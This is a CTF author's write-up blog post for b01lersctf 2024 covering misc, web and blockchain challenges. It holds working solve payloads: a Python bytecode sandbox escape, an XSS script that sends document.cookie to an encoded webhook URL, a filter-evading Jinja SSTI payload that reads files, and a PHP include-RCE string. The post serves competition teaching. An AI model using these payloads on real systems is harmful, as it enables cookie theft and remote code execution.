---
layout: post
title: "Author Writeups - b01lersctf 2024"
date: 2024-04-12 23:00:00
categories: writeups
tags: misc web blockchain pyjail author
excerpt: My author writeups for b01lersctf 2024
mathjax: false
---
* content
{:toc}

# misc
## wabash - Easy
178 solves - 176 points

### Challenge Description
{: .no_toc }
`wabash, its a river, but also a new shell! Flag is in /flag.txt`

We can notice when connecting to the netcat, that the program seems to append `wa` to the start of any command we type.

There are many solutions for this, one of which is `||$0` which executes `wa||$0`. `$0` is the first argument to any program, so in this case it is `sh`.

![Solve](../../../../images/wabash-solve.png)

## awpcode - Hard
2 solves - 498 points

### Challenge Description
{: .no_toc }
`The awp from cs can shoot through walls!`

This challenge has a short, but interesting source code. 

It is also important to note, the python version is `3.11.6`

```python
from types import CodeType
def x():pass
x.__code__ = CodeType(0,0,0,0,0,0,bytes.fromhex(input(">>> ")[:176]),(),(),(),'Δ','♦','✉︎',0,bytes(),bytes(),(),())
x()
```

The source code creates an empty function `x`, changes its source code to some bytecode that we can input as hex, then calls the function executing our bytecode.

Lets see what this code object is doing.
The important fields are listed below.

```python
CodeType(0,0,0,0,0,0,
bytes.fromhex(input(">>> ")[:176]), #our input
(), #co_consts
(), #co_names
(),'Δ','♦','✉︎',0,bytes(),bytes(),(),())
```

In python, when you run bytecode, python's bytecode interpreter looks to load any constants like `strings` or `integers` from a tuple named `co_consts`. In this case, `co_consts` is empty, so we can't use any constants in our code.

The next thing to note is that the `co_names` tuple is empty, so something that does `eval()` or `input()` or `os.system()` will not work, as `eval, input os, and system` are considered names, and will be looked up in `co_names`.

Seems impossible? See this [link](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes/load_name-load_const-opcode-oob-read)

From the above, we can see that python bytecode interpreter doesn't check if there is actually something in the `co_names` or `co_consts` tuple. It just goes to whatever offset the bytecode tells it to go to, and grabs whatever is there.

In our case, at an offset of `0x71` in `co_consts` there exists a builtins module. You can find this yourself by bruteforcing offsets till you find something useful.

Now we still have a small issue. How can we utilize this builtins module without any `co_names`?

The answer is to place the builtins module on the stack, pop off the stack until we reach a string with a function we want, then use that as a 'name' to call something from builtins.

{: .note }
There is a pretty small restriction on the length of our input byteccode, so we can use opcodes like `BUILD_MAP` to pop many arguments off the stack at a time. 

The final exploit is as follows.
1. Load the builtins module onto the stack
2. Pop off the stack until we reach the `input` string
3. Use the `input` string to get the `input` function from builtins
4. Store that function on the stack, call it, and store the result on the stack
5. Repeat 1-4 for `eval` 
6. Call `eval` function with `input` result as an argument
7. Execute arbitrary python like `__import__('os').system('sh')`

My code can be found in the challenge repository, but `Crazyman` and `woodwhale` from `no rev/pwn no life` has cleaner bytecode with a similar strategy, using `BUILD_TUPLE` instead of `BUILD_MAP`.
```python
import dis

def assemble(ops):
    cache = bytes([dis.opmap["CACHE"], 0])
    ret = b""
    for op, arg in ops:
        opc = dis.opmap[op]
        ret += bytes([opc, arg])
        ret += cache * dis._inline_cache_entries[opc]
    return ret

co_code = assemble(
    [
        ("RESUME", 0),
        ("LOAD_CONST", 115),
        ("UNPACK_EX", 29),
        ("BUILD_TUPLE", 28),
        ("POP_TOP", 0),
        ("SWAP", 2),
        ("POP_TOP", 0),
        ("LOAD_CONST", 115),
        ("SWAP", 2),
        ("BINARY_SUBSCR", 0),
        ("COPY", 1),
        ("CALL", 0),    # input
        
        ("LOAD_CONST", 115),
        ("UNPACK_EX", 21),
        ("BUILD_TUPLE", 20),
        ("POP_TOP", 0),
        ("SWAP", 2),
        ("POP_TOP", 0),
        ("LOAD_CONST", 115),
        ("SWAP", 2),
        ("BINARY_SUBSCR", 0),
        ("SWAP", 2),
        ("CALL", 0),    # exec
        
        ("RETURN_VALUE", 0),
    ]
)
print(co_code.hex())
```

# web
---
## b01ler-ads - Easy
108 solves - 302 points
### Challenge Description
{: .no_toc }
`Ads Ads Ads! Cheap too! You want an Ad on our site? Just let us know!`

The challenge is a simple `XSS` challenge. The source code is provided, but the important part is below.

```js
const content = req.body.content.replace("'", '').replace('"', '').replace("`", '');
```

The above code sanitizes the input by removing single quotes, double quotes, and backticks. This is a common mistake in web development, as it is easy to forget about other ways to escape strings.

We can construct a string using `String.fromCharCode` to bypass the filter.

```html
<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,55,98,54,51,102,55,53,97,45,57,52,55,53,45,52,49,56,56,45,98,51,56,57,45,51,54,53,99,56,102,57,100,48,102,100,97,47,63,102,108,97,103,61)%2bdocument.cookie)</script>
```

{: .note }
The challenge actually had a minor flaw as `.replace` only replaces the first instance of the character. This means that we can bypass the filter by appending ``` '"` ``` to the beginning of our payload

## pwnhub - Medium
15 solves - 481 points

### Challenge Description
{: .no_toc }
`A fun place to share all your exploits with others! I'm still working on developing some parts though`

The challenge is a `jinja ssti` with pretty heavy restrictions. The source code is provided, but the important part is below.

```python
app.secret_key = hex(getrandbits(20))
INVALID = ["{{", "}}", ".", "_", "[", "]","\\", "x"]
```
```python
@app.post('/createpost', endpoint='createpost_post')
@login_required
def createpost():
    not None
    content = request.form.get('content')
    post_id = sha256((current_user.name+content).encode()).hexdigest()
    if any(char in content for char in INVALID):
        return render_template_string(f'1{"".join("33" for _ in range(len(content)))}7 detected' )
    current_user.posts.append({str(post_id): content})
    if len(content) > 20:
        return render_template('createpost.html', message=None, error='Content too long!', post=None)
    return render_template('createpost.html', message=f'Post successfully created, view it at /view/{post_id}', error=None)
```
```python
@app.get('/view/<id>')
@login_required
def view(id):
    if (users[current_user.name].verification != V.admin):
        return render_template_string('This feature is still in development, please come back later.')
    content = next((post for post in current_user.posts if id in post), None)
    if not content:
        return render_template_string('Post not found')
    content = content.get(id, '')
    if any(char in content for char in INVALID):
        return render_template_string(f'1{"".join("33" for _ in range(len(content)))}7 detected')
    return render_template_string(f"Post contents here: {content[:250]}")
```

We can see to get to the vulnerable `render_template_string` call, you need to somehow spoof yourself as admin. The secret key is only 20 bits long, which is easily bruteforcable. You can use a tool like `flask-unsign` to get the secret key, then forge a cookie with the username as `admin`.

Next it seems that we have to find some payload shorter than 20 chars, but we can notice even though an error is displayed when it is longer, the post is still created. This means we can create a post with a payload longer than 20 chars, then view it to trigger the `ssti`.

Though the post id is not given, it is easily retreiavable by calculating
```python
post_id = sha256((current_user.name+content).encode()).hexdigest()
```
Lastly we need to bypass the restrictive `INVALID` chars.

We can almost exactly follow the payload given [here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars)

However, there is some issues because we don't have access to `\` or `x`.

We can bypass this by just hiding `_`s in the request arguments, and referencing them in the payload.

For example, we can use `request|attr("args")|attr("get")("d")` to get the value of `d` in the request arguments, which we can manually set to an underscore for example.

So our payload ends up looking like 

{% raw %}
```python
{% with a=request|attr("args")|attr("get")("d"),b=request|attr("args")|attr("get")("f")%}{%print(request|attr("application")|attr(a~"globals"~a)|attr(a~"getitem"~a)(a~"builtins"~a)|attr(a~"getitem"~a)("open")(b)|attr("read")())%}{%endwith%}
```
{% endraw %}

And we can view it at `/view/e5c478f7e0ea9f7e6dc8bcd722a3c93c4d849397b2e8c25ff283b95a8aa1eaa7?d=__&f=flag.txt`

{% raw %} 
```python
print(hashlib.sha256(('admin'+'{%with a=request|attr("args")|attr("get")("d"),b=request|attr("args")|attr("get")("f")%}{%print(request|attr("application")|attr(a~"globals"~a)|attr(a~"getitem"~a)(a~"builtins"~a)|attr(a~"getitem"~a)("open")(b)|attr("read")())%}{%endwith%}').encode()).hexdigest())
```
{% endraw %}
Generates the hash.
Viewing our post gives the flag.

## Library of <?php - Medium
7 solves - 492 points

### Challenge Description
{: .no_toc }
The flag should show up eventually... Right?

This challenge is a pretty spaghetti code php challenge. But what php code isn't spaghetti lol...

The important part of the code is below.

```php
public function __construct($q, $owner) {
        $this->search = $q;
        if (gettype($q) !== 'string') {
            die('Invalid input');
        }
        $this->validate();
        for ($i = 0; $i < strlen($q); $i++) {
            $this->seed += ord($q[$i]);
        }
        $this->seed = ($this->seed % 1000000) * 1000000;
        $this->calcPage();
        mt_srand($this->seed);
        $this->owners[$owner] = uniqid();
    }
```
```php
public function generateResults($name) {
        ob_start();
        $results = '';
        for ($i = 0; $i < 10000; $i++) {
            $results .= $this->alpha[mt_rand(0, strlen($this->alpha) - 1)];
        }
        echo "Discoverer: ";
        if ($this->owners[$name]) {
            echo $this->owners[$name] . '<br><br>';
        }
        $results = substr($results, 0, strlen($results) - strlen($this->search));
        $t = mt_rand(0, strlen($results));
        echo substr($results, 0, $t) . '<b>' . htmlspecialchars($this->search, ENT_QUOTES, 'UTF-8') . '</b>' . substr($results, $t);
        $f = './tmp/' . uniqid() . '.txt';
        file_put_contents($f,  ob_get_contents());
        ob_end_clean(); // xss mitigations.
        return $f;
    }
```

And the error_handler.php file.

We can see that for some reason this code uses object buffers, and writes to a file when you search for something.

In search.php: 
```php
if (hash('sha256', $d + rand(0, getrandmax())) === $securify) {
            include getBookPath($_GET['s']);
        }
        else {
            echo getBook($_GET['s']);
    }
```
This is the part where we can get RCE, when php `includes` a file, it actually executes the code in the file. We can see that the `securify` hash is generated by adding a random number to the `d` parameter, then hashing it. This is pretty weak, as we can just pass in a super large number and php will coerce the sum to be `INF` which we can easily find the hash of.

Now our problem is, how can we actually get php code to execute. We need `<?php` to be at the start of the file, but we can't get type the `<?` characters.

This is where the error handler comes in. We see that with some clever type jugging tricks, we can specify our own values as the username, and get 

```php
echo "Discoverer: ";
        if ($this->owners[$name]) {
            echo $this->owners[$name] . '<br><br>';
        }
```

To throw an error, with our username at the end.

This is enough for `<?php ` to be appended to our file, and we only need to bruteforce the babel output to start with a comment like `/*` and we can search for soemthing like `*/ echo system('cat /flag.txt')` to get the flag. This comments out the gibberish in the babel output, and then runs the php code.

For example 
```php
*/echo `cat /flag.txt`;//KFVdZfHwainAvfyyIJwEfPssLleFvYagqqxtFfycfmUXmCXiUVFBMVrloKOHzJqYzRQfyNfeNkGBWqZMOKEdWIhXFUfatFvCQsUFEnMKjykuCzcgukFxJUePDvHBTYLUtaSAVtCcDDQQpNDuMMhBsSVzeVylDVMaMQMFQTgsvBHBuSmvYLLpEgtwheSTgpqNfSCyWAYQqndXwCyLRGkUlUZYWhdncTxhFNpewYvdJKPakmmjrjxrZHXa
```
works, and we can just go to the search page with`d` and `securify` as set above to get the flag.
# blockchain
---
## burgercoin - Easy
31 solves - 458 points

### Challenge Description
{: .no_toc }
`b01lers started a new burger chain called b01lerburgers! On your first burger purchase you get a free burgercoin token!`

The challenge is a simple ethereum contract challenge. The contract is below.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract burgercoin {
    address public owner;
    mapping (address => uint) public balances;
    int public totalSupply;


    constructor() {
        owner = msg.sender;
        balances[owner] = 30;
        // only 10 burgercoin in circulation for now
        totalSupply = 10;
    }

    function purchaseBurger() public {
        require(balances[msg.sender] == 0, "You already claimed your burgercoin!");
        balances[msg.sender] = 1;
        totalSupply -= 1;
    }

    function giveBurger(address to) public {
        require(balances[msg.sender] >= 30, "You are not the burger joint owner");
        balances[to] += 1;
    }

    function transfer(address to, uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }

    function getBalance(address user) public view returns (uint) {
        return balances[user];
    }

    function transferBurgerjointOwnership(address newOwner) public {
        require(balances[msg.sender] >= 30, "You are not the burger joint owner");
        owner = newOwner;
    }

    function isSolved() public view returns (bool) {
        return balances[owner] == 0;
    }
}
```

Our goal is to bankrupt the contract owner, but we can actually see if we are able to transfer ownership to an address with no burgercoin, the contract is marked as solved.

To become owner we need to get 30 burger coins. We can do this by calling `purchaseBurger` 30 times from different addresses. The contract won't run out of burgercoin since it is an `int` and can go negative.

After we have 30 burgercoins, we can call `transferBurgerjointOwnership` to transfer ownership to an address with 0 burgercoins.

Then the challenge is solved.

Solve Contract:
```js
contract Attack {
    burgercoin public target;

    constructor(address _target) {
        target = burgercoin(_target);
    }

    function attack(address _me) public {
        target.purchaseBurger();
        target.transfer(_me, 1);
    }

    function isSolved() public view returns (bool) {
        return target.isSolved();
    }
}
```

# Review
---

I'd say this iteration of bctf2024 went very well, and people seemed to have a lot of fun solving my challenges! 

See some stats below
```
739 total teams
393 teams solved sanity check or more
276 teams solved a non-sanity check chall
```

See you next year!!
